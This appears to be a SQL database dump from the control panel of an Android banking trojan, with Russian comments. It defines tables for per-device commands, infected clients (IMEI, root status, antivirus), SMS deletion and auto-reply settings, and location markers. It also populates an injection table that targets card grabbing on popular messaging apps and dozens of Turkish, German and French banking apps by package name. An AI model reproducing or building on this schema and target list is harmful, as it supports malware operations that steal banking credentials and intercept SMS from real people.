-- phpMyAdmin SQL Dump
-- version 4.6.4
-- https://www.phpmyadmin.net/
--
-- Хост: localhost
-- Время создания: Мар 25 2017 г., 15:18
-- Версия сервера: 5.7.16-log
-- Версия PHP: 7.0.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `database`
--

-- --------------------------------------------------------

--
-- Структура таблицы `commands`
--

CREATE TABLE `commands` (
  `id` int(255) UNSIGNED NOT NULL,
  `IMEI` varchar(60) NOT NULL,
  `command` varchar(2000) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `injection`
--

CREATE TABLE `injection` (
  `id` int(60) UNSIGNED NOT NULL,
  `name` varchar(500) NOT NULL,
  `process` varchar(500) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `injection`
--

INSERT INTO `injection` (`id`, `name`, `process`) VALUES
(1, 'Грабинг СС', 'grab1,com.whatsapp,com.android.vending,com.facebook.orca,com.facebook.katana,com.tencent.mm,com.ubercab,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android'),
(2, 'Грабер СС mini', 'grab3,com.whatsapp,com.android.vending,com.facebook.orca,com.facebook.katana,com.tencent.mm,com.ubercab,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android'),
(3, 'AkBank(TR)', 'tr_akbank,com.akbank.android.apps.akbank_direkt,com.akbank.android.apps.akbank_direkt_tablet,com.akbank.softotp,com.mobilike.cepbutcem,akbank.yatirimci.mobile'),
(4, 'QNB FinansBank(TR)', 'tr_qnb_finansbank,com.finansbank.mobile.cepsube,finansbank.enpara,com.magiclick.FinansPOS,com.matriksdata.finansyatirim,finansbank.enpara.sirketim,com.vipera.ts.starter.QNB,com.QNBAlAhli,com.qnbbank.mobile'),
(5, 'GarantiBank(TR)', 'tr_garantibank,com.garanti.cepsubesi,com.garanti.cepbank,com.garantibank.cepsubesiro,biz.mobinex.android.apps.cep_sifrematik,com.garantiemeklilik.cepsube,garanti.etrader'),
(6, 'HalkBank(TR)', 'tr_halkbank,com.tmobtech.halkbank,com.SifrebazCep,eu.newfrontier.iBanking.mobile.Halk.Retail,rs.telnet.cacanskabankadroid,halkcorporate.mk'),
(7, 'isBank(TR)', 'tr_isbank,com.pozitron.iscep,com.softtech.isbankasi,com.yurtdisi.iscep,com.softtech.iscek,com.monitise.isbankmoscow'),
(8, 'YapiKredi(TR)', 'tr_yapikredi,com.ykb.android,com.ykb.android.mobilonay,com.ykb.avm,com.ykb.androidtablet,com.veripark.ykbaz'),
(9, 'ziraatBanksi(TR)', 'tr_ziraatbanksi,com.ziraat.ziraatmobil,com.ziraat.ziraattablet,com.matriksmobile.android.ziraatTrader'),
(16, 'Comdirect(DE)', 'de_Comdirect,de.comdirect.android'),
(17, 'CommerzBank(DE)', 'de_CommerzBank,de.commerzbanking.mobil'),
(18, 'Consorsbank(DE)', 'de_Consorsbank,de.consorsbank'),
(19, 'DeutscheBank(DE)', 'de_DeutscheBank,com.db.mm.deutschebank'),
(20, 'DKB(DE)', 'de_DKB,com.de.dkb.portalapp'),
(21, 'ING_DiBa(DE)', 'de_ING_DiBa,com.ing.diba.mbbr2'),
(22, 'Postbank(DE)', 'de_Postbank,de.postbank.finanzassistent'),
(23, 'Santander(DE)', 'de_Santander,mobile.santander.de'),
(24, 'Sparkasse(DE)', 'de_Sparkasse,com.starfinanz.smob.android.*'),
(25, 'Volksbank(DE)', 'de_Volksbank,de.fiducia.smartphone.android.banking.vr'),
(26, 'Agricole(FR)', 'fr_agricole,fr.creditagricole.androidapp'),
(27, 'Axa(FR)', 'fr_axa,fr.axa.monaxa'),
(28, 'BanquePopulaire(FR)', 'fr_BanquePopulaire,fr.banquepopulaire.cyberplus'),
(29, 'BNPParibas(FR)', 'fr_BNPParibas,net.bnpparibas.mescomptes'),
(30, 'Boursorama(FR)', 'fr_Boursorama,com.boursorama.android.clients'),
(31, 'CaisseEpargne(FR)', 'fr_CaisseEpargne,com.caisseepargne.android.mobilebanking'),
(32, 'LCL(FR)', 'fr_LCL,fr.lcl.android.customerarea'),
(33, 'SocieteGenerale(FR)', 'fr_SocieteGenerale,mobi.societegenerale.mobile.lappli');

-- --------------------------------------------------------

--
-- Структура таблицы `kliets`
--

CREATE TABLE `kliets` (
  `id` int(255) UNSIGNED NOT NULL,
  `IMEI` varchar(300) NOT NULL,
  `number` varchar(300) DEFAULT NULL,
  `version` varchar(100) NOT NULL,
  `country` varchar(30) DEFAULT NULL,
  `bank` varchar(500) DEFAULT NULL,
  `model` varchar(50) DEFAULT NULL,
  `lastConnect` varchar(30) NOT NULL,
  `firstConnect` varchar(30) NOT NULL,
  `inj` varchar(2) DEFAULT NULL,
  `l_bank` varchar(2) DEFAULT NULL,
  `log` varchar(2) DEFAULT NULL,
  `r00t` varchar(10) DEFAULT NULL,
  `screen` varchar(10) DEFAULT NULL,
  `version_apk` varchar(20) DEFAULT NULL,
  `color` varchar(20) DEFAULT NULL,
  `av` varchar(500) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `kliets`
--

INSERT INTO `kliets` (`id`, `IMEI`, `number`, `version`, `country`, `bank`, `model`, `lastConnect`, `firstConnect`, `inj`, `l_bank`, `log`, `r00t`, `screen`, `version_apk`, `color`, `av`) VALUES
(375, '1243567', '98888888', '1.2', 'us', 'no', 'HTC', '02-02-2017 09:30', '02-02-2017 09:30', '0', '0', '0', '', '', '1.2', 'no', 'no'),
(376, '321', '53421', '1.2', 'us', 'no', 'HTC', '2017-03-25 14:27', '02-02-2017 09:30', '1', '0', '1', '', '', '1.2', 'purple', 'no');

-- --------------------------------------------------------

--
-- Структура таблицы `markers`
--

CREATE TABLE `markers` (
  `id` int(11) NOT NULL,
  `name` varchar(60) NOT NULL,
  `lat` float(10,6) NOT NULL,
  `lng` float(10,6) NOT NULL,
  `type` varchar(30) NOT NULL,
  `provayder` varchar(30) DEFAULT NULL,
  `time` varchar(30) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `settings`
--

CREATE TABLE `settings` (
  `id` int(60) UNSIGNED NOT NULL,
  `IMEI` varchar(1000) NOT NULL,
  `inject` varchar(3000) DEFAULT NULL,
  `del_sms` varchar(3000) DEFAULT NULL,
  `state` varchar(5) DEFAULT NULL,
  `avtootvet_num` varchar(50) DEFAULT NULL,
  `avtootvet_sig1` varchar(3000) DEFAULT NULL,
  `avtootvet_sig2` varchar(3000) DEFAULT NULL,
  `avtootvet_true` varchar(5) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `settings`
--

INSERT INTO `settings` (`id`, `IMEI`, `inject`, `del_sms`, `state`, `avtootvet_num`, `avtootvet_sig1`, `avtootvet_sig2`, `avtootvet_true`) VALUES
(1, '1243567', '', '', '1', '', '', '', ''),
(2, '321', '', '', '1', '', '', '', '');

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `commands`
--
ALTER TABLE `commands`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`);

--
-- Индексы таблицы `injection`
--
ALTER TABLE `injection`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `kliets`
--
ALTER TABLE `kliets`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`),
  ADD KEY `id_2` (`id`);

--
-- Индексы таблицы `markers`
--
ALTER TABLE `markers`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `commands`
--
ALTER TABLE `commands`
  MODIFY `id` int(255) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `injection`
--
ALTER TABLE `injection`
  MODIFY `id` int(60) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;
--
-- AUTO_INCREMENT для таблицы `kliets`
--
ALTER TABLE `kliets`
  MODIFY `id` int(255) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=377;
--
-- AUTO_INCREMENT для таблицы `markers`
--
ALTER TABLE `markers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=194;
--
-- AUTO_INCREMENT для таблицы `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(60) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
